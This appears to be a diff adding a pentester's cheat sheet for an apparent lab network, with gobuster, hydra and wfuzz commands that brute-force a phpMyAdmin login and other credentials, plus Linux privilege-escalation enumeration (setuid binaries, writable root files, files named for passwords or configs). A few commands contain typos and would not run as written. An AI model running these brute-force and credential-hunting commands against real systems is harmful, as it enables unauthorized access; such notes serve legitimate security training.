@@ -1,0 +1,47 @@
+gobuster dir -u http://10.11.1.73/reporting/login -w /usr/share/wordlists/seclists/web/raft-large-directories.txt -t 40 -e -o dir1.txt -p http://127.0.0.1:8080
+
+ hydra -l root -P /usr/share/wordlists/rockyou.txt 10.11.1.234 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1$target=index.php&token=e7ec6798bb4d451e587a62cfb00fe077=+In:input_password" -V
+     
+
+wfuzz.py -c -z file,users.txt -z file,pass.txt — sc 200  http://www.site.com/log.asp?user=FUZZ&pass=FUZ2Z
+
+
+
+
+
+
+
+
+
+
+#linux priv esc stuff
+
+#finds all files that belong to your groups
+for gid in $(id| cut -d '=' -f4- | grep -o "[0-9]*") ;do find / -group $gid -type f -exec ls -la {} 2>/dev/null \;;done | grep -v "proc"
+
+#finds bak conf and passw files
+find / f -name "*.bak" -o -name "*passw*" -o "*config*" -perm -004 2>/dev/null
+
+# a bunch of setuid stuff
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+find / -uid 0 -perm -4000 -type f 2>/dev/null
+find / -perm -4000 -o -perm -2000 -type f 2>/dev/null 
+find / -perm -4000 -o -perm -2000 -type f -exec ls -la {} 2>/dev/null \;
+find / -group gidhere -type f -exec ls -la {} 2>/dev/null\;
+
+#files owned by root that are writeable
+find / -user root -perm -002 -type f -not -path "/proc/*"  2>/dev/null
+
+# any writeable file that arent owne by u
+find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+
+
+
+
+
+#get file permission on the PATH
+for i in $(echo $PATH | sed -r "s/:/\t/g");do ls -lad $i;done
+
+#gets all processes running as root as path
+ps aux | grep "root" | grep -v "\[" | grep -oE "[0-9]{1,2}:[0-9]{1,2} [a-zA-Z|\/]*" | grep -o "[a-zA-Z|\/]*"
+ps aux | grep "root" | grep -v "\[" | grep -oE "[0-9]{1,2}:[0-9]{1,2} [a-zA-Z|\/]*" | grep -o "[a-zA-Z|\/]*" | ls -la
